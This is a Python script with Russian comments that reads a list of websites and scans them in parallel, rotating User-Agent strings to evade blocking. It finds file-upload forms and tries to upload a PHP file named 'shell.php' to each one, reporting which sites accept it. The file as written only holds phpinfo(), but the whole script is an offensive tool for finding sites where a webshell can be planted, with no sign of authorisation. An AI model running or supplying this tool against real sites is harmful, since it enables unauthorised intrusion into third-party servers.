import aiohttp
import asyncio
from bs4 import BeautifulSoup
import os
from random import choice
from urllib.parse import urljoin

# Готовим файл для теста
payload_file = "shell.php"
with open(payload_file, 'w') as f:
    f.write("<?php phpinfo(); ?>")  # Простой PHP код для теста

# Список User-Agent'ов для обхода блокировок
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
]

# ANSI Escape Codes для цвета
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# Функция для асинхронного сканирования сайта
async def scan_for_file_upload(session, url):
    try:
        headers = {'User-Agent': choice(USER_AGENTS)}

        # Выполняем GET-запрос с заголовками
        async with session.get(url, headers=headers) as response:
            if response.status != 200:
                print(f"[{url}] Ошибка получения страницы: {response.status}")
                return

            # Парсим HTML страницы
            soup = BeautifulSoup(await response.text(), 'html.parser')
            forms = soup.find_all('form')

            # Проверка на наличие формы с файлом
            for form in forms:
                file_input = form.find('input', {'type': 'file'})
                if file_input:
                    # Пытаемся найти точку загрузки
                    action_url = form.get('action')
                    full_action_url = urljoin(url, action_url) if action_url else url
                    print(f"Найдена форма с загрузкой файлов на странице: {url}")
                    result = await try_upload_file(session, full_action_url, payload_file)
                    if result == "ДА":
                        print(f"{url} - {GREEN}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
                    else:
                        print(f"{url} - {RED}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
                    return  # Если файл загружен, можно прекратить обработку этой формы.

    except Exception as e:
        print(f"Ошибка при обработке сайта {url}: {str(e)}")

# Попытка загрузить PHP файл
async def try_upload_file(session, action_url, payload_file):
    try:
        # Проверка, если URL действует для загрузки
        print(f"Попытка загрузки на {action_url}...")
        async with aiohttp.ClientSession() as upload_session:
            with open(payload_file, 'rb') as file:
                files = {'file': (payload_file, file, 'application/x-php')}
                async with upload_session.post(action_url, data=files) as upload_response:
                    if upload_response.status == 200:
                        # Проверим, был ли файл успешно загружен
                        if 'php' in await upload_response.text():
                            return "ДА"
                        else:
                            return "НЕТ"
                    else:
                        return f"Ошибка при загрузке: {upload_response.status}"
    except Exception as e:
        return f"Ошибка при загрузке на {action_url}: {str(e)}"

# Основная функция для сканирования всех сайтов
async def scan_sites_from_file(file_path):
    if not os.path.exists(file_path):
        print(f"Файл {file_path} не найден.")
        return

    # Чтение URL из файла
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file.readlines()]

    # Асинхронная сессия
    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            tasks.append(scan_for_file_upload(session, url))

        # Параллельное выполнение всех задач
        await asyncio.gather(*tasks)

# Запуск асинхронного сканирования
file_path = "sites.txt"  # Путь к файлу с сайтами
asyncio.run(scan_sites_from_file(file_path))
